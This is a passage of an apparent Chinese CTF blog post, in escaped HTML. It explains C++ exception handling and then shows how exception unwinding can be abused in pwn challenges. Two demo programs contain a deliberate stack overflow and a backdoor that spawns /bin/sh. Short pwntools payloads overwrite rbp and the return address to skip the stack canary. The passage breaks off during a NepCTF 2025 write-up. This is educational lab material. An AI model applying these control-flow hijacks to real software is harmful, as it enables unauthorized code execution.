happened&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;这个表达式会创建一个特殊的对象：称为&lt;strong&gt;异常对象&lt;/strong&gt;，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈&lt;/li&gt;&#xA;&lt;li&gt;传给&lt;code&gt;catch&lt;/code&gt;的时候，是先复制一份，再传过去&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;不能抛出局部对象的指针&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;栈展开时，局部对象会被销毁&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;int* f() {&#xA;    int x = 42;&#xA;    throw &amp;amp;x; // x 会在函数退出时销毁&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等&lt;code&gt;catch&lt;/code&gt;执行时，这个对象可能已经销毁，造成悬空指针&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;抛出异常时对类型的要求&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;//只有声明而没有定义&#xA;class Incomplete; // 声明&#xA;&#xA;void foo() {&#xA;    throw Incomplete(); &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;类类型必须有可访问的析构函数&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;类类型必须有可访问的拷贝构造函数或移动构造函数&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;当抛出数组或函数时， 数组或函数类型会自动转成指针类型&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;catch&#34;&gt;&lt;span&gt;catch&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#catch&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;catch的参数就行函数参数&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;catch (类型 参数名)&lt;/code&gt; 的写法很像函数的参数声明&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;如果你不需要用到这个参数，可以省略名字：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;catch (std::runtime_error&amp;amp;) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;catch参数类型规则&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;必须是 &lt;strong&gt;完整类型&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;允许左值引用 &lt;code&gt;catch (MyEx&amp;amp;)&lt;/code&gt;、禁止右值引用 &lt;code&gt;catch (MyEx&amp;amp;&amp;amp;)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;匹配规则&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;当一个异常被&lt;code&gt;throw&lt;/code&gt;，程序会按顺序检查所有&lt;code&gt;catch&lt;/code&gt;，第一个能匹配的catch会被选中，不会继续往后寻找&lt;/p&gt;&#xA;&lt;p&gt;因此，&lt;strong&gt;更具体的异常类型必须放在更前面&lt;/strong&gt;，如果有继承关系，&lt;strong&gt;子类的 catch 必须写在前面&lt;/strong&gt;，基类的写在后面。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;rethrow&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;有时候，一个 &lt;code&gt;catch&lt;/code&gt; 只能做一部分处理，但真正的处理逻辑要交给更上层的函数&lt;/p&gt;&#xA;&lt;p&gt;这时候，&lt;code&gt;catch&lt;/code&gt; 里可以用 &lt;code&gt;throw;&lt;/code&gt; 语句把当前异常重新抛出，交给上层的 &lt;code&gt;catch&lt;/code&gt; 来继续处理。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;catch (std::exception&amp;amp; e) {&#xA;    std::cerr &amp;lt;&amp;lt; &amp;#34;Log: &amp;#34; &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; &amp;#34;\n&amp;#34;;&#xA;    throw; &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;The Catch-All Handler&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;catch(...)&lt;/code&gt; 是一种特殊的 &lt;code&gt;catch&lt;/code&gt; 块，用于&lt;strong&gt;捕获任何类型的异常&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;try {&#xA;    throw 42;  &#xA;} catch (...) {&#xA;    std::cout &amp;lt;&amp;lt; &amp;#34;Caught something!&amp;#34;;  &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;try&#34;&gt;&lt;span&gt;try&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#try&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;普通try块（ordinary try block）&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;只对 &lt;code&gt;try { ... }&lt;/code&gt; 内部抛出的异常有效。&lt;/li&gt;&#xA;&lt;li&gt;会按顺序匹配，第一个符合类型的 handler 会接管。&lt;/li&gt;&#xA;&lt;li&gt;在 try 外面抛出的异常，跟这个 handler 没关系。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;void f() {&#xA;    throw 1;  // 不会被下面的 catch 捕获&#xA;    try {&#xA;        throw 2; // 会被下面的 catch(...) 捕获&#xA;    } catch (...) {&#xA;        // 处理 2&#xA;    }&#xA;    throw 3;  // 也不会被上面的捕获&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;函数try块（function try block）&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;和普通 try 不同，它不是语句，而是 &lt;strong&gt;整个函数体&lt;/strong&gt; 被 &lt;code&gt;try&lt;/code&gt; 包裹&lt;/p&gt;&#xA;&lt;p&gt;它的作用范围比普通的广，它能捕获：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;函数体里的异常&lt;/li&gt;&#xA;&lt;li&gt;（如果是构造函数）初始化列表里的异常&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct X {&#xA;    int mem;&#xA;&#xA;    // 构造函数初始化列表抛出异常&#xA;    X() try : mem(f(true)) {&#xA;        // 构造函数体&#xA;    } catch (...) {&#xA;        // 能捕获 f(true) 抛出的异常&#xA;    }&#xA;&#xA;    // 构造函数体里抛出的异常&#xA;    X(int) try {&#xA;        throw 2;&#xA;    } catch (...) {&#xA;        // 捕获 2&#xA;    }&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;noexcept&#34;&gt;&lt;span&gt;noexcept&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#noexcept&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;void recoup(int) noexcept;   // 不会抛异常&#xA;void alloc(int);             // 可能抛异常&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们用&lt;code&gt;noexcept&lt;/code&gt;来承诺一个函数不会抛出异常，这种承诺叫做&lt;strong&gt;nonthrowing specification&lt;/strong&gt;（不抛异常说明）&lt;/p&gt;&#xA;&lt;p&gt;需要注意：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;noexcept&lt;/code&gt; 必须出现在所有函数声明和定义里，或者都不出现&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;void f() noexcept;     // 声明&#xA;void f() noexcept { }  // 定义&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;如果函数声明为 &lt;code&gt;noexcept&lt;/code&gt;，但运行时仍然抛出异常，程序会调用 &lt;code&gt;std::terminate&lt;/code&gt;，直接结束&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;noexcept&lt;/code&gt;应该在以下两种情形中被使用：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;我们确信该函数不会抛出异常&lt;/li&gt;&#xA;&lt;li&gt;我们不知道如何处理异常&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;pwn中的利用&#34;&gt;&lt;span&gt;pwn中的利用&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#pwn%e4%b8%ad%e7%9a%84%e5%88%a9%e7%94%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;demo1&#34;&gt;&lt;span&gt;demo1&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#demo1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;修改rbp控制程序执行流&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;// exception.cpp&#xA;// g&amp;#43;&amp;#43; exception.cpp -o exc -no-pie -fPIC&#xA;#include &amp;lt;stdio.h&amp;gt;&#xA;#include &amp;lt;stdlib.h&amp;gt;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xA; &#xA;void backdoor()&#xA;{&#xA;    try&#xA;    {&#xA;        printf(&amp;#34;We have never called this backdoor!&amp;#34;);&#xA;    }&#xA;    catch (const char *s)&#xA;    {&#xA;        printf(&amp;#34;[!] Backdoor has catched the exception: %s\n&amp;#34;, s);&#xA;        system(&amp;#34;/bin/sh&amp;#34;);&#xA;    }&#xA;}&#xA; &#xA;class x&#xA;{&#xA;public:&#xA;    char buf[0x10];&#xA;    x(void)&#xA;    {&#xA;        // printf(&amp;#34;x:x() called!\n&amp;#34;);&#xA;    }&#xA;    ~x(void)&#xA;    {&#xA;        // printf(&amp;#34;x:~x() called!\n&amp;#34;);&#xA;    }&#xA;};&#xA; &#xA;void input()&#xA;{&#xA;    x tmp;&#xA;    printf(&amp;#34;[!] enter your input:&amp;#34;);&#xA;    fflush(stdout);&#xA;    int count = 0x100;&#xA;    size_t len = read(0, tmp.buf, count);&#xA;    if (len &amp;gt; 0x10)&#xA;    {&#xA;        throw &amp;#34;Buffer overflow.&amp;#34;;&#xA;    }&#xA;    printf(&amp;#34;[&amp;#43;] input() return.\n&amp;#34;);&#xA;}&#xA; &#xA;int main()&#xA;{&#xA;    try&#xA;    {&#xA;        input();&#xA;        printf(&amp;#34;--------------------------------------\n&amp;#34;);&#xA;        throw 1;&#xA;    }&#xA;    catch (int x)&#xA;    {&#xA;        printf(&amp;#34;[-] Int: %d\n&amp;#34;, x);&#xA;    }&#xA;    catch (const char *s)&#xA;    {&#xA;        printf(&amp;#34;[-] String: %s\n&amp;#34;, s);&#xA;    }&#xA;    printf(&amp;#34;[&amp;#43;] main() return.\n&amp;#34;);&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把input函数的rbp改成&lt;code&gt;puts_got - 8&lt;/code&gt;，程序就会跳到&lt;code&gt;puts_got&lt;/code&gt;中存储的地址去执行，也就是执行&lt;code&gt;puts&lt;/code&gt;函数&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pl = b&amp;#39;a&amp;#39;*0x30 &amp;#43; p64(0x404050 -8 ) #puts_got -8&#xA;p.sendafter(b&amp;#39;input:&amp;#39;,pl)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里有几个点：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;pl覆盖了&lt;code&gt;input&lt;/code&gt;函数的&lt;code&gt;canary&lt;/code&gt;，但是由于栈展开，直接去到上层调用链找catch，不会检查&lt;code&gt;canary&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;input&lt;/code&gt;函数[rbp]存的是&lt;code&gt;main&lt;/code&gt;函数的&lt;code&gt;rbp&lt;/code&gt;，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;demo2&#34;&gt;&lt;span&gt;demo2&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#demo2&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;修改retaddr，调用其他catch&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;// exception.cpp&#xA;// g&amp;#43;&amp;#43; exception.cpp -o exc -no-pie -fPIC&#xA;#include &amp;lt;stdio.h&amp;gt;&#xA;#include &amp;lt;stdlib.h&amp;gt;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xA; &#xA;void backdoor()&#xA;{&#xA;    try&#xA;    {&#xA;        printf(&amp;#34;We have never called this backdoor!&amp;#34;);&#xA;    }&#xA;    catch (const char *s)&#xA;    {&#xA;        printf(&amp;#34;[!] Backdoor has catched the exception: %s\n&amp;#34;, s);&#xA;        system(&amp;#34;/bin/sh&amp;#34;);&#xA;    }&#xA;}&#xA;&#xA;class x&#xA;{&#xA;public:&#xA;    char buf[0x10];&#xA;    x(void)&#xA;    {&#xA;        // printf(&amp;#34;x:x() called!\n&amp;#34;);&#xA;    }&#xA;    ~x(void)&#xA;    {&#xA;        // printf(&amp;#34;x:~x() called!\n&amp;#34;);&#xA;    }&#xA;};&#xA; &#xA;void test()&#xA;{&#xA; x tmp;&#xA; printf(&amp;#34;[!] enter your input:&amp;#34;);&#xA; fflush(stdout);&#xA; int count = 0x100;&#xA; size_t len = read(0, tmp.buf, count);&#xA; if (len &amp;gt; 0x10)&#xA; {&#xA;     throw &amp;#34;Buffer overflow.&amp;#34;;&#xA; }&#xA; printf(&amp;#34;[&amp;#43;] test() return.\n&amp;#34;);&#xA;}&#xA; &#xA;void input()&#xA;{&#xA; try&#xA; {&#xA;     test();&#xA; }&#xA; catch (const char *s)&#xA; {&#xA;     printf(&amp;#34;[-] String(From input): %s\n&amp;#34;, s);&#xA; }&#xA; printf(&amp;#34;[&amp;#43;] input() return.\n&amp;#34;);&#xA;}&#xA; &#xA;int main()&#xA;{&#xA;    try&#xA;    {&#xA;        input();&#xA;        printf(&amp;#34;--------------------------------------\n&amp;#34;);&#xA;        throw 1;&#xA;    }&#xA;    catch (int x)&#xA;    {&#xA;        printf(&amp;#34;[-] Int: %d\n&amp;#34;, x);&#xA;    }&#xA;    catch (const char *s)&#xA;    {&#xA;        printf(&amp;#34;[-] String: %s\n&amp;#34;, s);&#xA;    }&#xA;    printf(&amp;#34;[&amp;#43;] main() return.\n&amp;#34;);&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里，我们发送&lt;code&gt;pl1&lt;/code&gt;，就能调用到&lt;code&gt;backdoor&lt;/code&gt;函数里的catch&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pl = pad &amp;#43; p64(0x404050-0x8)#puts_got -8&#xA;pl1 =  b&amp;#39;a&amp;#39;*0x30&amp;#43; p64(0x404050-0x8) &amp;#43; p64(0x401292&amp;#43;1)#backdoor_addr &amp;#43; 1&#xA;&#xA;p.sendafter(b&amp;#39;input:&amp;#39;,pl1)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;pl1&lt;/code&gt;把&lt;code&gt;input&lt;/code&gt;函数的返回地址改成了&lt;code&gt;backdoor_addr + 1&lt;/code&gt;，而抛出异常是在&lt;code&gt;input&lt;/code&gt;函数里抛出的，此时的调用链就变成了&lt;code&gt;input&lt;/code&gt; -&amp;gt; &lt;code&gt;backdoor&lt;/code&gt;，&lt;code&gt;input&lt;/code&gt;中没有找到对应的handler，&lt;code&gt;backdoor&lt;/code&gt;中有，就去执行&lt;code&gt;backdoor&lt;/code&gt;里的了&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;为什么需要把&lt;code&gt;backdoor_addr&lt;/code&gt;去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297]&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;nepctf-2025-canutrytry&#34;&gt;&lt;span&gt;NepCTF 2025 canutrytry&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#nepctf-2025-canutrytry&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;修改rbp控制程序执行流+修改retaddr调用其他catch+栈迁移&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;逆向分析&#34;&gt;&lt;span&gt;逆向分析&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%80%86%e5%90%91%e5%88%86%e6%9e%90&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#xA;{&#xA;  int v3; // [rsp&amp;#43;4h] [rbp-2Ch] BYREF&#xA;  unsigned __int64 v4; // [rsp&amp;#43;18h] [rbp-18h]&#xA;&#xA;  v4 = __readfsqword(0x28u);&#xA;  init();&#xA;  while ( 1 )&#xA;  {&#xA;    while ( 1 )&#xA;    {&#xA;      menu();&#xA;      std::istream::operator&amp;gt;&amp;gt;(&amp;amp;std::cin, &amp;amp;v3);&#xA;      if ( v3 != 1 )&#xA;        break;&#xA;      visit();&#xA;    }&#xA;    if ( v3 != 2 )&#xA;      exit(0);&#xA;    leave();&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在&lt;code&gt;init&lt;/code&gt;中：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;开了沙箱，只允许四个系统调用，&lt;code&gt;read&lt;/code&gt;、&lt;code&gt;write&lt;/code&gt;、&lt;code&gt;close&lt;/code&gt;、&lt;code&gt;futex&lt;/code&gt;，&lt;/li&gt;&#xA;&lt;li&gt;打开了flag，把flag读到0x4053c0&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;提供两个选项&lt;code&gt;visit&lt;/code&gt;和&lt;code&gt;leave&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;**&lt;code&gt;visit&lt;/code&gt;**中提供三个选项：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;**left：**根据size_list申请堆块&lt;/li&gt;&#xA;&lt;li&gt;**right：**讲size写入size_list数组&lt;/li&gt;&#xA;&lt;li&gt;**stright：**输入index，往相应堆块中读入数据&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;leave：&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;输入index，把堆块内容复制到栈中**（这里存在栈溢出）**，如果size大于0x10，就抛出异常&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;异常处理：&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;抛出异常：&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;visit中的left如果检查到size小于等于0,就会抛出**&amp;ldquo;invalid 